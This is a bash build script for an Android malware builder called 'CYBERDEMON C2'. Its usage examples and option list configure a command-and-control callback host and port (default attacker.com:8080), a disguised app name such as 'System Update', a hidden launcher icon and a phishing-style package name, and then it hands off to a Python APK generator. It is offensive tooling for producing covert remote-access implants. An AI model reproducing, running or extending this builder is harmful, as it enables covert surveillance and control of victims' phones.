#!/bin/bash
# Build script for CYBERDEMON C2 Android APK
# Run this script from the apk_builder directory
#
# Usage:
#   ./build.sh
#   ./build.sh --c2-host 10.10.14.5 --c2-port 4444 --target-url http://10.10.14.5:5000
#   ./build.sh --app-name "System Update" --c2-host myserver.com --c2-port 8443
#   ./build.sh --icon /path/to/icon.png --hide-icon
#   ./build.sh --package org.phishing.app --min-sdk 24

set -e

export JAVA_HOME=/usr/lib/jvm/jdk-17.0.11+9
export PATH=$JAVA_HOME/bin:$PATH
export ANDROID_HOME=/home/demonwarrior/android-sdk
export ANDROID_SDK_ROOT=$ANDROID_HOME

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] CYBERDEMON C2 APK Builder v2.0"
echo "[*] ========================"
echo "[*] JAVA_HOME=$JAVA_HOME"
echo "[*] ANDROID_HOME=$ANDROID_HOME"
echo ""
echo "[*] Options:"
echo "    --c2-host HOST       C2 server host (default: attacker.com)"
echo "    --c2-port PORT       C2 server port (default: 8080)"
echo "    --target-url URL     WebView URL to load (default: https://example.com)"
echo "    --app-name NAME      Display name (default: CYBERDEMON C2)"
echo "    --icon PATH          Custom icon PNG (default: icon.png)"
echo "    --hide-icon          Hide icon from launcher"
echo "    --package PKG        Package name (default: org.cyberdemon.c2)"
echo "    --output PATH        Output APK path"
echo "    --min-sdk VER        Min SDK version (default: 21)"
echo "    --target-sdk VER     Target SDK version (default: 34)"
echo ""

python3 "$SCRIPT_DIR/generate_apk.py" "$@"
